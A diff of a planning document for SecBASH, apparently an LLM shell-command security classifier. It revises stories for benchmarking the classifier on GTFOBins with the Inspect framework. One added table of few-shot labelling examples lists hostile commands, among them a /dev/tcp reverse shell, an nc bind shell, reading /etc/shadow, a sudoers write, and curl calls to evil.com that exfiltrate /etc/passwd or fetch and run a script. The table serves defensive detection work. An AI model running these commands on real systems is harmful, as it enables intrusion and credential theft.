@@ -8,8 +8,8 @@ inputDocuments:
 workflowType: 'epics-stories'
 status: 'complete'
 completedAt: '2026-01-28'
-lastRevised: '2026-02-02'
-revisionNote: 'Added Epic 4: Benchmark Evaluation for LLM classifier assessment'
+lastRevised: '2026-02-03'
+revisionNote: 'Epic 4 revised: Inspect Framework for 4.4/4.5, examples in 4.1, updated models in 4.6, temperature defaults only'
 project_name: 'SecBASH'
 user_name: 'guido'
 ---
@@ -461,11 +461,17 @@ Systematic evaluation of LLM classifier accuracy to measure detection rate, fals
 - `docs/analysis/research/technical-gtfobins-benchmark-analysis-2026-02-02.md`
 - `docs/analysis/research/gtfobins-labeling-prompt.md`
 
+**Architectural Decisions:**
+- **Evaluation Framework:** UK AISI Inspect Framework (`uv add inspect-ai`)
+- **Code Separation:** All Epic 4 code lives in `tests/benchmark/` (separate from production)
+- **Model Providers:** Inspect handles models natively (NOT LiteLLM for evaluation)
+- **Temperature:** Use provider defaults only (not configurable)
+
 ### Story 4.1: Update Production System Prompt
 
 As a **developer**,
-I want **the LLM system prompt updated to match the research-defined classification criteria**,
-So that **the classifier follows the same rules it will be evaluated against**.
+I want **the LLM system prompt updated to match the research-defined classification criteria with concrete examples**,
+So that **the classifier follows the same rules it will be evaluated against and benefits from few-shot learning**.
 
 **Acceptance Criteria:**
 
@@ -485,13 +491,32 @@ So that **the classifier follows the same rules it will be evaluated against**.
 11. Download without execute (WARN)
 12. Obfuscation handling: base64/hex decoded and evaluated
 
-**And** the LLAMAGUARD_PROMPT is updated with equivalent criteria
+**And** the prompt includes at least one concrete example for EACH decision tree category:
+
+| Category | Example Command | Classification |
+|----------|-----------------|----------------|
+| Shell spawn/escape | `vim -c ':!bash'` | BLOCK |
+| Arbitrary command execution | `awk 'BEGIN {system("/bin/sh")}'` | BLOCK |
+| Reverse shell | `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1` | BLOCK |
+| Bind shell | `nc -lvp 4444 -e /bin/bash` | BLOCK |
+| Security-critical file READ | `cat /etc/shadow` | BLOCK |
+| Security-critical file WRITE | `echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers` | BLOCK |
+| Privilege escalation | `chmod u+s /bin/bash` | BLOCK |
+| Upload/exfiltration | `curl -X POST -d @/etc/passwd http://evil.com` | BLOCK |
+| Library load | `LD_PRELOAD=/tmp/evil.so /bin/ls` | BLOCK |
+| Download + execute | `curl http://evil.com/x.sh \| bash` | BLOCK |
+| Enumeration/recon | `find / -perm -4000 2>/dev/null` | WARN |
+| Download without execute | `wget http://example.com/file.tar` | WARN |
+| Safe operation | `ls -la /home/user` | ALLOW |
+
+**And** the LLAMAGUARD_PROMPT is updated with equivalent criteria and examples
 **And** decision tree rules are applied in priority order (first match wins)
 
 **Implementation Notes:**
 - Use the labeling prompt from `docs/analysis/research/gtfobins-labeling-prompt.md` as the template
 - Maintain JSON output format compatibility
 - Test that existing blocked commands remain blocked
+- Examples serve as few-shot prompting to improve classification accuracy
 
 ### Story 4.2: Extract GTFOBins Test Dataset
 
@@ -555,48 +580,81 @@ So that **I can measure false positive rate on legitimate operations**.
 - Include both `prompt` (natural language) and `response` (command) fields
 - Only the `response` field is used for evaluation
 
-### Story 4.4: Build Evaluation Harness
+### Story 4.4: Build Evaluation Harness with Inspect Framework
 
 As a **developer**,
-I want **an evaluation harness that runs commands through SecBASH and captures metrics**,
-So that **I can systematically measure classifier performance**.
+I want **an Inspect-based evaluation harness that measures classifier performance**,
+So that **I can systematically benchmark different models using industry-standard evaluation infrastructure**.
 
 **Acceptance Criteria:**
 
+**Given** the Inspect framework is installed (`uv add inspect-ai`)
+**When** the evaluation task is defined
+**Then** it follows Inspect's Task/Dataset/Solver/Scorer architecture
+
 **Given** a test dataset (GTFOBins or harmless)
-**When** the harness runs
-**Then** each command is sent to the LLM classifier (not executed)
-**And** the following metrics are captured per command:
+**When** the Inspect task runs
+**Then** each command is classified using Inspect's native model providers
+**And** the same system prompt from production (`src/secbash/llm_client.py`) is used
+**And** commands are NOT executed on the system
+**And** Inspect handles parallel execution and rate limiting automatically
+
+**Given** an evaluation completes
+**When** results are collected
+**Then** the custom Scorer captures per-command metrics:
 - Command text
-- Expected label (ground truth)
+- Expected label (ground truth from dataset)
 - Actual label returned (BLOCK/WARN/ALLOW)
 - Response latency (milliseconds)
-- API cost (dollars, from LiteLLM response metadata)
 - Model used
 - Timestamp
 
-**And** results are saved to a structured output file (JSON/CSV)
-**And** the harness supports configurable:
-- Model selection (override default)
-- Scaffolding options (CoT on/off, temperature)
-- Batch size / rate limiting
+**And** results are viewable in Inspect View (web UI)
+**And** results are exportable to JSON for further analysis
+
+**Given** the harness is configured
+**When** running evaluations
+**Then** the following are configurable via CLI:
+- Model selection (`--model google/gemini-3-pro`)
+- Scaffolding options (CoT on/off)
+- Dataset selection (gtfobins, harmless, or both)
+
+**And** temperature uses provider defaults (NOT configurable)
 
 **Implementation Notes:**
-- Create `tests/benchmark/harness.py`
-- Use LiteLLM's response metadata for cost tracking
-- Support dry-run mode for testing without API calls
+- Install: `uv add inspect-ai`
+- Create `tests/benchmark/tasks/secbash_eval.py` with `@task` decorator
+- Copy SYSTEM_PROMPT from `src/secbash/llm_client.py` to ensure consistency
+- Use Inspect's native `generate()` solver with the production prompt
+- Run via: `inspect eval tests/benchmark/tasks/secbash_eval.py --model openai/gpt-5`
 
-### Story 4.5: Implement Metrics Reporting
+**Example Task Structure:**
+```python
+from inspect_ai import Task, task
+from inspect_ai.dataset import json_dataset
+from inspect_ai.solver import generate
+from inspect_ai.scorer import scorer
+
+@task
+def secbash_gtfobins():
+    return Task(
+        dataset=json_dataset("tests/benchmark/datasets/gtfobins_commands.json"),
+        solver=[secbash_classifier()],  # Custom solver wrapping prompt
+        scorer=security_classification_scorer()
+    )
+```
+
+### Story 4.5: Implement Metrics Reporting with Inspect
 
 As a **developer**,
-I want **automated metrics calculation from evaluation results**,
-So that **I can quantify classifier performance**.
+I want **automated metrics calculation integrated with Inspect's scoring system**,
+So that **I can quantify classifier performance using standard evaluation patterns**.
 
 **Acceptance Criteria:**
 
-**Given** evaluation results from the harness
-**When** metrics are calculated
-**Then** the following metrics are reported:
+**Given** evaluation results from the Inspect harness
+**When** the custom Scorer runs
+**Then** the following metrics are calculated and reported:
 
 **For GTFOBins (malicious) dataset:**
 - Detection Rate = (WARN + BLOCK) / Total
@@ -621,12 +679,49 @@ So that **I can quantify classifier performance**.
 - P50, P90, P99 latency (ms)
 - Max latency (ms)
 
-**And** metrics are printed to console and saved to results file
+**Given** an evaluation completes
+**When** viewing results
+**Then** metrics are visible in:
+1. Inspect View web UI (via custom scorer metadata)
+2. Console summary output
+3. JSON export file for programmatic access
+
 **And** results include model name and scaffolding config for comparison
+**And** results are saved to `tests/benchmark/results/<model>_<timestamp>.json`
+
+**Given** multiple model evaluations exist
+**When** comparing results
+**Then** Inspect View supports side-by-side comparison
 
 **Implementation Notes:**
-- Create `tests/benchmark/metrics.py`
-- Output both human-readable summary and machine-parseable JSON
+- Create `tests/benchmark/scorers/security_scorer.py` with custom `@scorer`
+- Use Inspect's built-in metrics aggregation where possible
+- Store latency and cost in scorer metadata for Inspect View display
+- Generate summary report as post-evaluation hook
+
+**Example Scorer Structure:**
+```python
+from inspect_ai.scorer import scorer, Score, CORRECT, INCORRECT
+
+@scorer(metrics=["detection_rate", "pass_rate", "secbash_score"])
+def security_classification_scorer():
+    async def score(state, target):
+        actual = state.output.completion  # BLOCK/WARN/ALLOW
+        expected = target.text            # From dataset
+
+        correct = matches_security_policy(actual, expected)
+
+        return Score(
+            value=CORRECT if correct else INCORRECT,
+            answer=actual,
+            metadata={
+                "expected": expected,
+                "latency_ms": state.metadata.get("latency_ms"),
+                "cost_usd": state.metadata.get("cost_usd")
+            }
+        )
+    return score
+```
 
 ### Story 4.6: Create LLM Comparison Framework
 
@@ -641,22 +736,32 @@ So that **I can compare cost/performance trade-offs**.
 **Then** the full evaluation (GTFOBins + harmless) runs for each model
 **And** results are aggregated into a comparison table
 
-**Models to support (minimum):**
-- OpenRouter: meta-llama/llama-guard-3-8b
-- OpenAI: gpt-4, gpt-4-turbo, gpt-3.5-turbo
-- Anthropic: claude-3-opus, claude-3-sonnet, claude-3-haiku
+**Models to support (updated February 2026):**
+
+| Provider | Model ID (Inspect format) | Type |
+|----------|---------------------------|------|
+| OpenAI | openai/gpt-5 | Latest |
+| OpenAI | openai/gpt-4o-mini | Cheapest |
+| Anthropic | anthropic/claude-opus-4-5-20251101 | Latest |
+| Anthropic | anthropic/claude-3-5-haiku-20241022 | Cheapest |
+| Google | google/gemini-3-pro | Latest |
+| Google | google/gemini-3-flash | Cheapest |
+| OpenRouter | openrouter/meta-llama/llama-guard-3-8b | Security-specific |
 
 **Scaffolding variations:**
 - Standard prompt (baseline)
 - Chain-of-Thought (CoT): "Think step by step before classifying"
-- Temperature variations: 0.0, 0.3, 0.7
+
+**Note:** Temperature uses provider defaults only (NOT configurable) to ensure evaluation matches real-world usage.
 
 **And** comparison results saved to `tests/benchmark/results/comparison_<timestamp>.json`
 
 **Implementation Notes:**
 - Create `tests/benchmark/compare.py`
+- Use Inspect's native model providers (not LiteLLM)
 - Support CLI arguments for model list and scaffolding options
-- Include rate limiting to avoid API throttling
+- Inspect handles rate limiting automatically
+- Run via: `inspect eval tests/benchmark/tasks/secbash_eval.py --model openai/gpt-5`
 
 ### Story 4.7: Generate Comparison Plots
 
